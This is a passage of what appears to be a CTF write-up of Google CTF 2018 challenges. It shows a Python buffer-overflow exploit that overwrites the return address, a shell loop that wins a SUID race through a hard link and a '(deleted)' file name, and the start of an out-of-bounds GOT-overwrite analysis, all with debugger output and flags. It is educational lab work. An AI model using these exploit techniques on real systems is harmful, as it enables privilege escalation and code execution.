Okay, so I know we have a format string exploit and a buffer overflow, let's see where the `read_flag` function is in memory which we can then use to overwrite the [RIP](https://stackoverflow.com/questions/42215105/understanding-rip-register-in-intel-assembly) or Instruction Pointer to read the flag.

<p align="center"><a href="/images/gctf18-pwn2-8.png"><img src="/images/gctf18-pwn2-8.png"></a></p>

We can see that the function is at the memory address of `606063A5`, from here let's verify the security properties of the executable.

```console
root@kali:~/Google-CTF/Message Of The Day# checksec motd
[*] '/root/Google-CTF/Message Of The Day/motd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Awesome, so there's no ASLR and no stack canaries, so we can easily attempt a buffer overflow and replace the `RIP` with the address of the `read_flag` function. Let's test this locally.

I will be using [PEDA](https://github.com/longld/peda) with [gdb](https://www.gnu.org/software/gdb/) to make looking at the exploit easier.

First off, let's create a string of A's that 256 bytes long, followed by a string of B's that 8 bytes. The B's will represent the memory address we want to inject, also reason the B's are 8 bytes long is because this is an x64 architecture, and not x86 where in x86 addresses are 4 bytes long.

```console
root@kali:~/Google-CTF/Message Of The Day# perl -e 'print "A"x256 . "B"x8'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```

Alright, now let's start the application in gdb, select choice 2 to write a new message, and enter our generated string.

```console
root@kali:~/Google-CTF/Message Of The Day# gdb -q ./motd
Reading symbols from ./motd...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /root/Google-CTF/Message Of The Day/motd 
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 2
Enter new message of the day
New msg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
New message of the day saved!

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1e 
RBX: 0x0 
RCX: 0x7ffff7eca874 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9d8c0 --> 0x0 
RSI: 0x7ffff7f9c7e3 --> 0xf9d8c0000000000a 
RDI: 0x0 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffe060 --> 0x7fffffffe178 --> 0x7fffffffe476 ("/root/Google-CTF/Message Of The Day/motd")
RIP: 0x60606300 (<main+167>:	fistp  WORD PTR [rdi-0x7c03ba77])
R8 : 0x7ffff7fa2500 (0x00007ffff7fa2500)
R9 : 0x7fffffffdfa0 ('A' <repeats 176 times>, "BBBBBBBB")
R10: 0x0 
R11: 0x246 
R12: 0x60606060 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe170 --> 0xa32 ('2\n')
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x60606300 <main+167>:	fistp  WORD PTR [rdi-0x7c03ba77]
   0x60606306 <main+173>:	jge    0x60606304 <main+171>
   0x60606308 <main+175>:	add    BYTE PTR [rbp+0xe],dh
   0x6060630b <main+178>:	lea    rdi,[rip+0x2a9]        # 0x606065bb
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe060 --> 0x7fffffffe178 --> 0x7fffffffe476 ("/root/Google-CTF/Message Of The Day/motd")
0008| 0x7fffffffe068 --> 0x100000000 
0016| 0x7fffffffe070 --> 0x60606420 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffe078 --> 0x60606060 (<_start>:	xor    ebp,ebp)
0032| 0x7fffffffe080 --> 0x7fffffffe170 --> 0xa32 ('2\n')
0040| 0x7fffffffe088 --> 0x200000000 
0048| 0x7fffffffe090 --> 0x60606420 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffe098 --> 0x7ffff7e0409b (<__libc_start_main+235>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000060606300 in main ()
gdb-peda$ 
```

Awesome, right away we notice that the [RBP](https://stackoverflow.com/questions/41912684/what-is-the-purpose-of-the-rbp-register-in-x86-64-assembler) or Base Pointer has been overwritten. This is great for us because when a buffer overflow occurs, the first thing that it will overwrite is the saved RBP (base pointer), then the saved RIP (saved return address) and then the function parameters. This occurs because the stack is in [FILO](https://techterms.com/definition/filo) or First In Last Out order. 

So if we add 4 more bytes of, let's say the C character of `0x43` in hex, then we can overwrite the return pointer. Let's test this.

```console
db-peda$ r
Starting program: /root/Google-CTF/Message Of The Day/motd 
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 2
Enter new message of the day
New msg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC
New message of the day saved!

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1e 
RBX: 0x0 
RCX: 0x7ffff7eca874 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9d8c0 --> 0x0 
RSI: 0x7ffff7f9c7e3 --> 0xf9d8c0000000000a 
RDI: 0x0 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffe060 --> 0x7fffffffe178 --> 0x7fffffffe476 ("/root/Google-CTF/Message Of The Day/motd")
RIP: 0x43434343 ('CCCC')
R8 : 0x7ffff7fa2500 (0x00007ffff7fa2500)
R9 : 0x7fffffffdfa0 ('A' <repeats 176 times>, "BBBBBBBBCCCC")
R10: 0x0 
R11: 0x246 
R12: 0x60606060 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe170 --> 0xa32 ('2\n')
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe060 --> 0x7fffffffe178 --> 0x7fffffffe476 ("/root/Google-CTF/Message Of The Day/motd")
0008| 0x7fffffffe068 --> 0x100000000 
0016| 0x7fffffffe070 --> 0x60606420 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffe078 --> 0x60606060 (<_start>:	xor    ebp,ebp)
0032| 0x7fffffffe080 --> 0x7fffffffe170 --> 0xa32 ('2\n')
0040| 0x7fffffffe088 --> 0x200000000 
0048| 0x7fffffffe090 --> 0x60606420 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffe098 --> 0x7ffff7e0409b (<__libc_start_main+235>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000043434343 in ?? ()
gdb-peda$ 
```

Awesome, look at that! Our RIP is overwritten and we get a segmentation fault as the return address does not exist! 

With this knowledge in mind, let's go ahead and write an exploit in python that will allow overflow the message buffer, overwrite the EBP with 8 bytes of junk, and then write the `read_flag` function into the RIP. This should then return to the function and print our flag.

```python
import socket
import struct
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("motd.ctfcompetition.com", 1337))

s.sendall("2\n")

buff = ("A"*256 + "A"*8 + "\xA5\x63\x60\x60")
s.sendall(buff + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Once our exploit is ready, let's execute it and hope for the best!

```console
root@kali:~/Google-CTF/Message Of The Day# python exploit.py 
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: Enter new message of the day
New msg: New message of the day saved!
Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
*** Connection closed by remote host ***
```

And there we have it, we got the flag!

__FLAG:__ CTF{m07d_1s_r3t_2_r34d_fl4g}

## Poetry

<p align="center"><a href="/images/gctf18-pwn2-9.png"><img src="/images/gctf18-pwn2-9.png"></a></p>

Upon reading the challenge description we learn that the Google-Haus is connected to the fridge, but unfortunately the credentials are only readable by root. Luckily for us, it seems there's another SUID binary that has all the hallmarks of something suspicious. 

From here, let's connect to the `poetry.ctfcompetition.com` server on port `1337` and see what we have.

```console
root@kali:~/Google-CTF/Poetry# nc poetry.ctfcompetition.com 1337
cd /home
ls -la
total 4
drwxrwxrwt  4 poetry poetry   80 Feb 25 03:02 .
drwxr-xr-x 21 poetry poetry 4096 Oct 24 19:10 ..
drwxr-xr-x  2 poetry poetry   80 Feb 25 03:02 poetry
drwxrwxrwx  2 poetry poetry   40 Feb 25 03:02 user
cd poetry
ls -la
total 900
drwxr-xr-x 2 poetry poetry     80 Feb 25 03:02 .
drwxrwxrwt 4 poetry poetry     80 Feb 25 03:02 ..
-r-------- 1 poetry poetry     19 Feb 25 03:02 flag
-rwsr-xr-x 1 poetry poetry 917192 Feb 25 03:02 poetry
```

Okay, it seems we have the flag and a binary called `poetry`. Let's see what it does.

```console
./poetry
./poetry test test

```

Huh... okay, nothing's working, that's odd.

Oh well, let's go ahead and download the attachment and extract the files. Maybe the files in there will provide us some guidance.

```console
root@kali:~/Google-CTF/Poetry# ls
poetry
root@kali:~/Google-CTF/Poetry# file poetry 
poetry: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=e453aa91df6a7a666a62fadfa8fb6fffaac5d9ba, not stripped
```

We see that we have another binary to dig into to, so let's open it up in IDA and see what it does.

<p align="center"><a href="/images/gctf18-pwn2-10.png"><img src="/images/gctf18-pwn2-10.png"></a></p>

Right from the start we see that the binary calls the [getenv](https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm) function and makes sure that [LD_BIND_NOW](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_MRG/1.3/html/Realtime_Tuning_Guide/sect-Realtime_Tuning_Guide-Application_Tuning_and_Deployment-Dynamic_Libraries_Loading.html) is set. If it's not set, then the application jumps to `loc_400A95` which then reads the value of the symbolic link of the application via [readlink](https://linux.die.net/man/2/readlink) and returns the number of bytes in the destination buffer otherwise it returns an error.

If data is returned it then jumps to `loc_400A2C`.

The code for this portion of the application can be viewed as the following:

```c
char dest;
if (!getenv("LD_BIND_NOW", argv, envp))
{
	if (readlink("/proc/self/exe", &dest, 4096LL) == -1)
		err(1);
}
```

Okay, so we know the first part of the application does. Let's keep digging into the rest of it.

<p align="center"><a href="/images/gctf18-pwn2-11.png"><img src="/images/gctf18-pwn2-11.png"></a></p>

We see that after the `readlink` function is successful, the application calls the [setenv](https://linux.die.net/man/3/setenv) function and sets `LD_BIND_NOW` to  `1`. Once that's done the application jumps to `loc_400A5E` and re runs the binary via the [execv](https://linux.die.net/man/3/execv) function which then checks to see if the `LD_BIND_NOW` environmental variable has been set. 

So the C code for the rest of this application should look like so:

```c
char dest;
if (!getenv("LD_BIND_NOW", argv, envp))
{
	if (readlink("/proc/self/exe", &dest, 4096LL) == -1)
		err(1);
	if ((unsigned int)setenv("LD_BIND_NOW", "1", 1LL))
		err(1);
	if ((unsigned int)execv(&dest, argv))
		err(1);
}
```

After looking over this code and file, it seems that a [race condition](https://en.wikipedia.org/wiki/Race_condition) might be present. Let me explain why I think this is true.

The binary first calls the `readlink` function which get's the [symbolic link](https://en.wikipedia.org/wiki/Symbolic_link) of the application via the [/proc/self/exe](http://man7.org/linux/man-pages/man5/proc.5.html) filesystem.

For example, if we copy over our Python binary, execute it, get the `pid` of the binary and read the `/proc/pid/exe` filesystem via `readlink` (since `ls` uses readlink), we will see the symbolic link of the binary.

```console
root@kali:/tmp# cp /usr/bin/python .
root@kali:/tmp# ./python 
Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
[1]+  Stopped                 ./python
root@kali:/tmp# jobs -p
3805
root@kali:/tmp# ls -la /proc/3805/exe
lrwxrwxrwx 1 root root 0 Feb 24 21:27 /proc/3805/exe -> /tmp/python
```

Okay, but what happens if that file is deleted? What happens to the symbolic link?

```console
root@kali:/tmp# rm /tmp/python 
root@kali:/tmp# ls -la /proc/3805/exe
lrwxrwxrwx 1 root root 0 Feb 24 21:27 /proc/3805/exe -> '/tmp/python (deleted)'
```

Interesting, it seems that our application now points to `/tmp/python (deleted)`. So what would happen if we create our own file with the name `python (deleted)`, would that execute? It actually would!

And because the application runs itself again, if we somehow can create a hard link, and remove it during execution then the application should call our deleted file, allowing us to execute a binary of our choice as root.

So in this case, let's copy over the `cat` binary and rename it to `exp (deleted)`.

```console
root@kali:~/Google-CTF/Poetry# nc poetry.ctfcompetition.com 1337
cd /home/user
cp /bin/cat 'exp (deleted)'
```

Once done, let's execute a bash script that will continuously loop. During this time, we will create a link between the `poetry` binary and a fake file called `exp` via the [ln](https://linux.die.net/man/1/ln) function. This `exp` file will act as the `cat` binary that we copied over and renamed to `exp (deleted)`.

After the link is created, we will execute `exp` against the flag, and then we will remove `exp`. Once `exp` is removed the symbolic link will point to `exp (deleted)` which is the `cat` binary that we copied over, and if we are successful it should print the flag!

Let's give this a go!

```console
while true; do ln /home/poetry/poetry ./exp; ( ./exp ../poetry/flag & ); rm exp; done
CTF{CV3-2009-1894}
/bin/bash: line 3: ./exp: No such file or directory
/bin/bash: fork: retry: No child processes
```

And just like that we got the flag!

As a side note, [CVE-2009-1894](https://www.cvedetails.com/cve/CVE-2009-1894/) was an actual Race Condition vulnerability in PulseAudio that utilized the same exploit as we just demonstrated. 

__FLAG:__ CTF{CV3-2009-1894}

## Fridge Todo List

<p align="center"><a href="/images/gctf18-pwn2-12.png"><img src="/images/gctf18-pwn2-12.png"></a></p>

Upon reading the challenge description we learn that the smart fridge 2000 has a TODO list network service that Wintermuted seems to use as a password storage medium. It's our job to find a bug that will leak the notes and possibly reveal the password.

Alright with that in mind, let's connect to the service and see what we can do.

```console
root@kali:~/Google-CTF/Fridge Todo List# nc fridge-todo-list.ctfcompetition.com 1337
███████╗███╗   ███╗ █████╗ ██████╗ ████████╗    ███████╗██████╗ ██╗██████╗  ██████╗ ███████╗    ██████╗  ██████╗  ██████╗  ██████╗        
██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝    ╚════██╗██╔═████╗██╔═████╗██╔═████╗       
███████╗██╔████╔██║███████║██████╔╝   ██║       █████╗  ██████╔╝██║██║  ██║██║  ███╗█████╗       █████╔╝██║██╔██║██║██╔██║██║██╔██║       
╚════██║██║╚██╔╝██║██╔══██║██╔══██╗   ██║       ██╔══╝  ██╔══██╗██║██║  ██║██║   ██║██╔══╝      ██╔═══╝ ████╔╝██║████╔╝██║████╔╝██║       
███████║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║       ██║     ██║  ██║██║██████╔╝╚██████╔╝███████╗    ███████╗╚██████╔╝╚██████╔╝╚██████╔╝       
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝        
                                                                                                                                          
 █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗     ████████╗ ██████╗ ██████╗  ██████╗     ██╗     ██╗███████╗████████╗
██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗    ██║     ██║██╔════╝╚══██╔══╝
███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║███████╗   ██║   
██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║╚════██║   ██║   
██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝       ██║   ╚██████╔╝██████╔╝╚██████╔╝    ███████╗██║███████║   ██║   
╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝        ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝     ╚══════╝╚═╝╚══════╝   ╚═╝   
user: admin


Hi admin, what would you like to do?
1) Print TODO list
2) Print TODO entry
3) Store TODO entry
4) Delete TODO entry
5) Remote administration
6) Exit
> 
```

It seems that the service asks for a username, I entered `admin` thinking it would do something special, but it didn't. We also see that we have access to a few options. The remote administration option is the most interesting, so let's see if it works.

```console
Hi admin, what would you like to do?
1) Print TODO list
2) Print TODO entry
3) Store TODO entry
4) Delete TODO entry
5) Remote administration
6) Exit
> 5


Sorry, remote administration is not available right now.
```

I really don't know what I was expecting.... Anyways, let's go ahead and download the attachment and extract the files to see what else we have to work with.

```console
root@kali:~/Google-CTF/Fridge Todo List# ls
todo  todo.c
root@kali:~/Google-CTF/Fridge Todo List# file todo
todo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=62100af46a33d62b1f40ab39375b25f9062180af, not stripped
root@kali:~/Google-CTF/Fridge Todo List# file todo.c 
todo.c: C source, UTF-8 Unicode text
```

We see that we have both the `todo` binary and its source code. Upon viewing the source code we are provided with the following.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <ctype.h>
#include <linux/limits.h>

const char BANNER[] = "\
███████╗███╗   ███╗ █████╗ ██████╗ ████████╗    ███████╗██████╗ ██╗██████╗  ██████╗ ███████╗    ██████╗  ██████╗  ██████╗  ██████╗        \n\
██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝    ╚════██╗██╔═████╗██╔═████╗██╔═████╗       \n\
███████╗██╔████╔██║███████║██████╔╝   ██║       █████╗  ██████╔╝██║██║  ██║██║  ███╗█████╗       █████╔╝██║██╔██║██║██╔██║██║██╔██║       \n\
╚════██║██║╚██╔╝██║██╔══██║██╔══██╗   ██║       ██╔══╝  ██╔══██╗██║██║  ██║██║   ██║██╔══╝      ██╔═══╝ ████╔╝██║████╔╝██║████╔╝██║       \n\
███████║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║       ██║     ██║  ██║██║██████╔╝╚██████╔╝███████╗    ███████╗╚██████╔╝╚██████╔╝╚██████╔╝       \n\
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝        \n\
                                                                                                                                          \n\
 █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗     ████████╗ ██████╗ ██████╗  ██████╗     ██╗     ██╗███████╗████████╗\n\
██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗    ██║     ██║██╔════╝╚══██╔══╝\n\
███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║███████╗   ██║   \n\
██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║       ██║   ██║   ██║██║  ██║██║   ██║    ██║     ██║╚════██║   ██║   \n\
██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝       ██║   ╚██████╔╝██████╔╝╚██████╔╝    ███████╗██║███████║   ██║   \n\
╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝        ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝     ╚══════╝╚═╝╚══════╝   ╚═╝   ";

const char MENU[] = "\n\
Hi %s, what would you like to do?\n\
1) Print TODO list\n\
2) Print TODO entry\n\
3) Store TODO entry\n\
4) Delete TODO entry\n\
5) Remote administration\n\
6) Exit\n\
> ";
const char OUT_OF_BOUNDS_MESSAGE[] = "Sorry but this model only supports 128 TODO list entries.\nPlease upgrade to the Smart Fridge 3001 for increased capacity.";

#define TODO_COUNT 128
#define TODO_LENGTH 48

int todo_fd;
char username[64];
char todos[TODO_COUNT*TODO_LENGTH];

void init() {
  system("mkdir todos 2>/dev/null");
  setlinebuf(stdout);
}

void read_line(char *buf, size_t buf_sz) {
  if (!fgets(buf, buf_sz, stdin)) {
    err(1, "fgets()");
  }
  size_t read_cnt = strlen(buf);
  if (read_cnt && buf[read_cnt-1] == '\n') {
    buf[read_cnt-1] = 0;
  }
}

bool read_all(int fd, char *buf, size_t read_sz) {
  while (read_sz) {
    ssize_t num_read = read(fd, buf, read_sz);
    if (num_read <= 0) {
      return false;
    }
    read_sz -= num_read;
    buf += num_read;
  }
  return true;
}

void write_all(int fd, char *buf, size_t write_sz) {
  while (write_sz) {
    ssize_t num_written = write(fd, buf, write_sz);
    if (num_written <= 0) {
      err(1, "write");
    }
    write_sz -= num_written;
    buf += num_written;
  }
}

bool string_is_alpha(const char *s) {
  for (; *s; s++) {
    if (!isalpha(*s)) {
      return false;
    }
  }
  return true;
}

bool list_is_empty() {
  for (int i = 0; i < TODO_COUNT; i++) {
    if(todos[i*TODO_LENGTH]) {
      return false;
    }
  }
  return true;
}

void print_list() {
  if (list_is_empty()) {
    puts("Your TODO list is empty. Enjoy your free time!");
    return;
  }
  puts("+=====+=================================================================+");
  for (int i = 0; i < TODO_COUNT; i++) {
    if(todos[i*TODO_LENGTH]) {
      printf("| %3d | %-63s |\n", i, &todos[i*TODO_LENGTH]);
    }
  }
  puts("+=====+=================================================================+");
}

void open_todos() {
  char todos_filename[PATH_MAX] = "todos/";
  strncat(todos_filename, username, sizeof(todos_filename)-strlen(todos_filename) - 1);

  todo_fd = open(todos_filename, O_RDWR);
  if (todo_fd != -1 && read_all(todo_fd, todos, sizeof(todos))) {
    if (!list_is_empty()) {
      print_list();
    }
  } else {
    todo_fd = open(todos_filename, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (todo_fd == -1) {
      err(1, "Could not create TODO storage file");
    }
  }
}

void authenticate() {
  printf("user: ");
  fflush(stdout);
  read_line(username, sizeof(username));

  if (!string_is_alpha(username)) {
    errx(1, "username can only consist of [a-zA-Z]");
  }
}

int read_int() {
  char buf[128];
  read_line(buf, sizeof(buf));
  return atoi(buf);
}

void store_todos() {
  write_all(todo_fd, todos, sizeof(todos));
  close(todo_fd);
}

void store_todo() {
  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("What's your TODO? ");
  fflush(stdout);
  read_line(&todos[idx*TODO_LENGTH], TODO_LENGTH);
}

void print_todo() {
  printf("Which entry would you like to read? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("Your TODO: %s\n", &todos[idx*TODO_LENGTH]);
}

void delete_todo() {
  printf("Which TODO number did you finish? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  todos[idx*TODO_LENGTH] = 0;
  if (list_is_empty()) {
    puts("Awesome, you cleared the whole list!");
  } else {
    puts("Nice job, keep it up!");
  }
}

bool administration_enabled() {
  return false;
}

void admin() {
  puts("Sorry, remote administration is not available right now.");
}

int main(int argc, char *argv[]) {
  init();

  puts(BANNER);

  authenticate();

  open_todos();

  while (true) {
    printf(MENU, username);
    fflush(stdout);
    int choice = read_int();
    puts("");
    switch (choice) {
      case 1:
        print_list();
        break;
      case 2:
        print_todo();
        break;
      case 3:
        store_todo();
        break;
      case 4:
        delete_todo();
        break;
      case 5:
        admin();
        break;
      case 6:
        store_todos();
        puts("Your TODO list has been stored. Have a nice day!");
        return 0;
      default:
        printf("unknown option %d\n", choice);
        break;
    }
  }
}
```

Looking into the code I see that option 5 runs the `admin` function, let's see what that does.

```c
bool administration_enabled() {
  return false;
}

void admin() {
  puts("Sorry, remote administration is not available right now.");
}
```

Well that was a bust, it doesn't do much except for printing the string we just saw. Oh well, that doesn't help us much, even the `administration_enabled` isn't used anywhere.... We need to keep digging.

Okay, let's start from the top choices and work our way down. When we choose the first option, case 1 is selected and it calls the `print_list` function. 

```c
void print_list() {
  if (list_is_empty()) {
    puts("Your TODO list is empty. Enjoy your free time!");
    return;
  }
  puts("+=====+=================================================================+");
  for (int i = 0; i < TODO_COUNT; i++) {
    if(todos[i*TODO_LENGTH]) {
      printf("| %3d | %-63s |\n", i, &todos[i*TODO_LENGTH]);
    }
  }
  puts("+=====+=================================================================+");
}
```

This function seems to print all the saved TODO strings from an array, nothing really wrong with this and there doesn't seem to be a bug here.

What about option 2, which allows us to print a specific TODO entry? Looking into the code we see that option two or case 2 calls the `print_todo` function.

```c
void print_todo() {
  printf("Which entry would you like to read? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("Your TODO: %s\n", &todos[idx*TODO_LENGTH]);
}
```

Right away I can spot an issue with this portion of the code. Take a look at the `idx` variable. This variable is a [signed integer](https://www.ibm.com/support/knowledgecenter/ssw_aix_72/com.ibm.aix.progcomc/int_dat_typ.htm)!

```c
int idx = read_int();
if (idx > TODO_COUNT) {
```

The `IF` function only checks if `idx` is larger than `TODO_COUNT` which is defined at the start of the application.

```c
#define TODO_COUNT 128
```

So what happens if `idx` is less than 0? Or a negative number? What happens then? Are we able to read outside the bound of the stack?

Let's also see option 3 which calls the `store_todo` function.

```c
void store_todo() {
  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  int idx = read_int();
  if (idx > TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
  }
  printf("What's your TODO? ");
  fflush(stdout);
  read_line(&todos[idx*TODO_LENGTH], TODO_LENGTH);
}
```

We have the same issue!  So with this we have an [out-of-bound reads](https://cwe.mitre.org/data/definitions/125.html) vulnerability, and also a [write-what-where](https://cwe.mitre.org/data/definitions/123.html) condition which should allow us to read data from the stack, and also write to it.

Let's open the `todo` binary in IDA and see if we can't find the `store_todo` function call.

<p align="center"><a href="/images/gctf18-pwn2-13.png"><img src="/images/gctf18-pwn2-13.png"></a></p>

Let's double click on the `store_todo` function call to see where in memory it's stored.

<p align="center"><a href="/images/gctf18-pwn2-14.png"><img src="/images/gctf18-pwn2-14.png"></a></p>

Okay, so it seems that this function is stored in the [.bss](https://en.wikipedia.org/wiki/.bss) section of memory which is used for statically allocated variables and the function is located at memory location `00203140`.

Since we can enter a negative number, we should be able to read up the stack. So let's scroll up in this section to see what we can read and possibly overwrite.

<p align="center"><a href="/images/gctf18-pwn2-15.png"><img src="/images/gctf18-pwn2-15.png"></a></p>

Awesome, it seems that the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) or Global Offset Table, and [PLT](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got) or the Procedure Linkage Table which is, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.

LiveOverflow has a great video explaining the GOT and PLT, which I suggest you watch!

{% include video id="kUk5pw4w0h4" provider="youtube" %}

So if we can read from or write to these addresses in the GOT and PLT, then we can call our own function to execute whatever we want, like [system](https://www.tutorialspoint.com/c_standard_library/c_function_system.htm).

But before we can do that, let's check the protection in place for the application.

```console
root@kali:~/Google-CTF/Fridge Todo List# checksec todo
[*] '/root/Google-CTF/Fridge Todo List/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

